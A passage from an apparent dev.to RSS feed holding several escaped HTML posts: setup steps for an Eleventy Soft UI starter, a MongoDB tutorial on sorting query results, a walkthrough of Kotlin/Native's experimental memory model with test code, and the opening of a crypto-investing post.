&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UNGq4U9q--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5w4nrjhqnvft0higq00e.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UNGq4U9q--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5w4nrjhqnvft0higq00e.png" alt="11ty Soft UI - User profile Page, provided by Eleventy, Prismic and AppSeed."&gt;&lt;/a&gt;&lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;11ty Soft UI - Contact Footer&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--lVqZZzPu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pjrhfqz5of77mquemh62.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--lVqZZzPu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pjrhfqz5of77mquemh62.png" alt="11ty Soft UI - Fancy footer, provided by Eleventy, Prismic and AppSeed."&gt;&lt;/a&gt;&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#lets-build-the-product"&gt;
  &lt;/a&gt;
  Let's build the product
&lt;/h2&gt;

&lt;p&gt;For full instructions please access the &lt;strong&gt;&lt;a href="https://appseed.us/product/eleventy-soft-ui"&gt;product page&lt;/a&gt;&lt;/strong&gt; (docs section).  &lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Step #1&lt;/strong&gt; - Clone this repository&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;git clone https://github.com/app-generator/eleventy-soft-ui-design.git
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;eleventy-soft-ui-design 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Step #2&lt;/strong&gt; - Install modules via NPM or Yarn&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;npm i
// OR
&lt;span class="nv"&gt;$ &lt;/span&gt;yarn
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Step #3&lt;/strong&gt; - Configure &lt;a href="http://prismic.io/"&gt;Prismic&lt;/a&gt; API Node&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Rename &lt;code&gt;.env.sample&lt;/code&gt; to &lt;code&gt;.env&lt;/code&gt; and specify the &lt;code&gt;PRISMIC_REPOSITORY_NAME&lt;/code&gt;. In case you are not familiar with &lt;code&gt;Prismic&lt;/code&gt;, feel free to use the &lt;code&gt;DEMO API&lt;/code&gt; provided by AppSeed: &lt;code&gt;https://eleventy-soft-ui-design.prismic.io/api/v2&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;PRISMIC_REPOSITORY_NAME=YOUR_PRISMIC_API_URL
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Step #4&lt;/strong&gt; - Start project in development mode&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;yarn start
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once the project is compiled and the content is pulled from &lt;code&gt;Prismic&lt;/code&gt;, the project can be visited in the browser: &lt;code&gt;http://localhost:8080&lt;/code&gt;.&lt;/p&gt;




&lt;p&gt;From this point the starter can be used to code simple websites and personal blogs using a modern stack and a pixel-perfect UI crafted by &lt;strong&gt;Creative-Tim&lt;/strong&gt;.&lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;Thanks for reading! For more resources please access:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://www.11ty.dev/"&gt;11ty&lt;/a&gt; - the official website&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://prismic.io/"&gt;Prismic CMS&lt;/a&gt; - official website&lt;/li&gt;
&lt;li&gt;More &lt;a href="https://appseed.us/static-site"&gt;static staters&lt;/a&gt; provided by &lt;strong&gt;AppSeed&lt;/strong&gt; &lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>webdev</category>
      <category>eleventy</category>
      <category>prismic</category>
      <category>softui</category>
    </item>
    <item>
      <title>How to sort the results of a MongoDB query</title>
      <author>Donald Feury</author>
      <pubDate>Sat, 07 Aug 2021 16:00:38 +0000</pubDate>
      <link>https://dev.to/dak425/how-to-sort-the-results-of-a-mongodb-query-2d5e</link>
      <guid>https://dev.to/dak425/how-to-sort-the-results-of-a-mongodb-query-2d5e</guid>
      <description>&lt;p&gt;For a full overview of MongoDB and all my posts on it, check out my &lt;a href="https://donaldfeury.xyz/introduction-to-mongodb/"&gt;overview&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After using the &lt;a href="https://donaldfeury.xyz/get-all-the-documents-out-of-a-collection-in-mongodb/"&gt;find method to get retrieve some documents from MongoDB&lt;/a&gt; and further &lt;a href="https://donaldfeury.xyz/how-to-retrieve-specific-documents-from-mongodb-using-filters/"&gt;trimming down that result using filters&lt;/a&gt;, there may still be a lot of data. It may be easier to work with the data if is it sorted using the &lt;code&gt;sort&lt;/code&gt; method.&lt;/p&gt;

&lt;p&gt;Much like how a user can &lt;a href="https://donaldfeury.xyz/use-the-limit-method-to-retrieve-a-specific-number-of-documents-from-mongodb/"&gt;modify the result of a query by chaining something like the limit method&lt;/a&gt;, you can use chain the &lt;code&gt;sort&lt;/code&gt; method to the result of another method that returns a result, such as &lt;code&gt;find&lt;/code&gt; or &lt;code&gt;limit&lt;/code&gt;, to get that data into a specific order.&lt;/p&gt;

&lt;p&gt;With the following data set in a collection called &lt;code&gt;users&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
    "name": "John Doe",
    "email": "test@test.com",
    "admin": false,
    "dateJoined": ISODate("2021-02-01")
},
{
    "name": "Jane Doe",
    "email": "test2@test2.com",
    "admin": false,
    "dateJoined": ISODate("2021-03-01")
},
{
    "name": "Bob Doe",
    "email": "bob@bob.com",
    "admin": true,
    "dateJoined": ISODate("2021-01-01")
},
{
    "name": "Your Mom",
    "email": "koolkid@someplace.com",
    "admin": false,
    "dateJoined": ISODate("2020-12-01")
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To pull all the documents out sorted by the date they joined in ascending order, we would do the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;db.users.find().sort({dateJoined: 1})

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Notice that &lt;code&gt;sort&lt;/code&gt; takes an argument of an object describing how to sort the data. Each field in the object can have a value of 1 (ascending) or -1 (descending)&lt;/p&gt;

&lt;p&gt;This will get us the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
    "name": "Your Mom",
    "email": "koolkid@someplace.com",
    "admin": false,
    "dateJoined": ISODate("2020-12-01")
},
{
    "name": "Bob Doe",
    "email": "bob@bob.com",
    "admin": true,
    "dateJoined": ISODate("2021-01-01")
},
{
    "name": "John Doe",
    "email": "test@test.com",
    "admin": false,
    "dateJoined": ISODate("2021-02-01")
},
{
    "name": "Jane Doe",
    "email": "test2@test2.com",
    "admin": false,
    "dateJoined": ISODate("2021-03-01")
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Sorting on multiple fields can be done as well&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;db.users.find().sort({admin: 1, name -1})

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will return the documents first sorted in ascending order by &lt;code&gt;admin&lt;/code&gt;, then sorted in descending order by &lt;code&gt;name&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
    "name": "Jane Doe",
    "email": "test2@test2.com",
    "admin": false,
    "dateJoined": ISODate("2021-03-01")
},
{
    "name": "John Doe",
    "email": "test@test.com",
    "admin": false,
    "dateJoined": ISODate("2021-02-01")
},
{
    "name": "Your Mom",
    "email": "koolkid@someplace.com",
    "admin": false,
    "dateJoined": ISODate("2020-12-01")
},
{
    "name": "Bob Doe",
    "email": "bob@bob.com",
    "admin": true,
    "dateJoined": ISODate("2021-01-01")
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>mongodb</category>
    </item>
    <item>
      <title>Trying out the experimental new Kotlin/Native memory model</title>
      <author>Russell Wolf</author>
      <pubDate>Sat, 07 Aug 2021 15:54:36 +0000</pubDate>
      <link>https://dev.to/touchlab/trying-out-the-experimental-new-kotlin-native-memory-model-235k</link>
      <guid>https://dev.to/touchlab/trying-out-the-experimental-new-kotlin-native-memory-model-235k</guid>
      <description>&lt;p&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@victorserban?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Victor Serban&lt;/a&gt; on &lt;a href="https://unsplash.com/?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If you've been following Kotlin/Native at all over the last couple of years, you'll know that it's memory model has been controversial. Last year, the Kotlin team &lt;a href="https://blog.jetbrains.com/kotlin/2020/07/kotlin-native-memory-management-roadmap/"&gt;committed to redesigning it&lt;/a&gt;, and this year they &lt;a href="https://blog.jetbrains.com/kotlin/2021/05/kotlin-native-memory-management-update/"&gt;promised a preview&lt;/a&gt; by the end of the summer. Well, there hasn't been an official announcement yet, but that preview is present in the Kotlin 1.5.30-M1 early-access release.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tldr"&gt;
  &lt;/a&gt;
  TL,DR
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Update your Kotlin version to 1.5.30-M1&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;kotlinOptions.freeCompilerArgs += listOf("-memory-model", "experimental")&lt;/code&gt; to your Kotlin/Native compilations&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;kotlin.native.cacheKind=none&lt;/code&gt; to &lt;code&gt;gradle.properties&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;Mutate unfrozen objects from different threads&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#wait-what"&gt;
  &lt;/a&gt;
  Wait, what?!
&lt;/h2&gt;

&lt;p&gt;Yup! The memory model is controlled with the &lt;code&gt;-memory-model&lt;/code&gt; command-line flag. Pass &lt;code&gt;experimental&lt;/code&gt; for the new model or &lt;code&gt;strict&lt;/code&gt; for the existing one&lt;sup&gt;*&lt;/sup&gt;. Due to current limitations, you also need to disable compiler caching with the &lt;code&gt;kotlin.native.cacheKind=none&lt;/code&gt; gradle property.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;sup&gt;*&lt;/sup&gt;You can also pass &lt;code&gt;relaxed&lt;/code&gt;, but it's probably not a good idea.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;You can pass the flag to all your Kotlin/Native targets by doing something like this from Gradle:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="nf"&gt;kotlin&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;targets&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;withType&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;KotlinNativeTarget&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;().&lt;/span&gt;&lt;span class="nf"&gt;all&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;compilations&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;all&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;kotlinOptions&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;freeCompilerArgs&lt;/span&gt; &lt;span class="p"&gt;+=&lt;/span&gt; 
                &lt;span class="nf"&gt;listOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"-memory-model"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"experimental"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now you can freely mutate unfrozen state across threads. Let's see what that looks like.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#testing-the-two-models"&gt;
  &lt;/a&gt;
  Testing the two models
&lt;/h2&gt;

&lt;p&gt;In the current strict memory model, if you wanted to write a function to run code in a background thread, it might look something like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;T&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;doInBackground&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nc"&gt;T&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="nc"&gt;T&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;worker&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Worker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;future&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;worker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="nc"&gt;TransferMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;SAFE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;freeze&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt; 
        &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nf"&gt;it&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The function takes a lambda, freezes it, and executes it in a new &lt;code&gt;Worker&lt;/code&gt; which runs on a background thread. Because the lambda is frozen, the only way we can have mutable state is by using atomics, as in the following test (which can run on the &lt;code&gt;iosX64&lt;/code&gt; target)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="nd"&gt;@Test&lt;/span&gt; &lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="nf"&gt;oldMemoryTest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;AtomicReference&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nf"&gt;doInBackground&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;didRunLambda&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;
        &lt;span class="nf"&gt;assertFalse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;didRunLambda&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we initialize an atomic boolean to false on the main thread, mutate it to true on a background thread, and assert that it's true from the main thread.&lt;/p&gt;

&lt;p&gt;Code like the above is the primary way of handling mutable state across threads in the current memory model (although it's usually hidden deep in the machinery of a library like &lt;code&gt;kotlinx.coroutines&lt;/code&gt;), and it still works in the experimental model. But we can also do new things we coudln't do before. &lt;/p&gt;

&lt;p&gt;We might naively expect that the new model will just let us drop the atomic and do something like the following&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="nd"&gt;@Test&lt;/span&gt; &lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="nf"&gt;newMemoryTest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="py"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nf"&gt;doInBackground&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt; &lt;span class="c1"&gt;// *&lt;/span&gt;
        &lt;span class="nf"&gt;assertFalse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;didRunLambda&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;However, this will fail at the starred line with an &lt;code&gt;InvalidMutabilityException&lt;/code&gt;. Our &lt;code&gt;doInBackground()&lt;/code&gt; function freezes the lambda, and the new memory model still respects freeze semantics and doesn't allow frozen things to change. That includes the &lt;code&gt;didRunLambda&lt;/code&gt; boolean which is captured from the outer scope.&lt;/p&gt;

&lt;p&gt;So let's create a new backgrounding function. Note that this function works only in the new model, and will fail with an &lt;code&gt;IllegalStateException&lt;/code&gt; if you use the existing strict memory model.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;T&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;doInBackgroundUnfrozen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nc"&gt;T&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="nc"&gt;T&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;worker&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Worker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;future&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;worker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="nc"&gt;TransferMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;SAFE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="c1"&gt;// No more freeze() call&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nf"&gt;it&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Subbing this function into the test allows it to pass in the new model.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="nd"&gt;@Test&lt;/span&gt; &lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="nf"&gt;newMemoryTestUnfrozen&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="py"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nf"&gt;doInBackgroundUnfrozen&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;
        &lt;span class="nf"&gt;assertFalse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;didRunLambda&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#further-thoughts"&gt;
  &lt;/a&gt;
  Further thoughts
&lt;/h2&gt;

&lt;p&gt;It's pretty neat seeing this in action! As the Kotlin team promised previously, existing code written around &lt;code&gt;freeze()&lt;/code&gt; in the strict memory model still appears to behave the same in the new experimental model. But we also now have the ability to pass unfrozen things across threads. This should mean that, once the model is finalized, existing code won't need to migrate immediately. However, early adopters of the experimental model will likely need to wait for any concurrency libraries they depend on to update, or else they'll still need to handle the existing &lt;code&gt;freeze()&lt;/code&gt; behavior. That work has &lt;a href="https://github.com/Kotlin/kotlinx.coroutines/issues/2797"&gt;already begun&lt;/a&gt; in &lt;code&gt;kotlinx.coroutines&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#caveats"&gt;
  &lt;/a&gt;
  Caveats
&lt;/h2&gt;

&lt;p&gt;The experimental new memory model is an undocumented preview release. I haven't tried much beyond what's presented here, and I have no idea what limitations or possible issues there are. Use at your own risk! That said, it might be a nice time to try it out, especially if you maintain library code that handles freeze-related logic currently. Be sure to report any bugs you see, and give JetBrains feedback on if it works for you.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#should-i-use-this-in-production"&gt;
  &lt;/a&gt;
  Should I use this in production?
&lt;/h2&gt;

&lt;p&gt;No.&lt;/p&gt;




&lt;p&gt;Thanks for reading! Let me know in the comments if you have questions, or you can reach out to me at &lt;a class="mentioned-user" href="https://dev.to/russhwolf"&gt;@russhwolf&lt;/a&gt;
 on &lt;a href="https://twitter.com/RussHWolf"&gt;Twitter&lt;/a&gt; or the &lt;a href="https://slack.kotlinlang.org"&gt;Kotlin Slack&lt;/a&gt;. And if you find all this interesting, maybe you'd like to &lt;a href="https://touchlab.co/contact-us/"&gt;work with&lt;/a&gt; or &lt;a href="https://touchlab.co/careers-3/"&gt;work at&lt;/a&gt; Touchlab.&lt;/p&gt;

</description>
      <category>kotlin</category>
      <category>kotlinmultiplatform</category>
    </item>
    <item>
      <title>6 crypto investment mistakes I made so you don't have to</title>
      <author>topjer</author>
      <pubDate>Sat, 07 Aug 2021 15:44:32 +0000</pubDate>
      <link>https://dev.to/topjer/6-crypto-investment-mistakes-i-made-so-you-don-t-have-to-1m98</link>
      <guid>https://dev.to/topjer/6-crypto-investment-mistakes-i-made-so-you-don-t-have-to-1m98</guid>
      <description>&lt;p&gt;The crypto world is exciting. Filled to the brim with technological possibilities unimaginable mere 10 years ago. As a result it becomes harder and harder not to dip your toe into these waters if you have even a remote interest in technology. This is at least how it was for me.&lt;/p&gt;

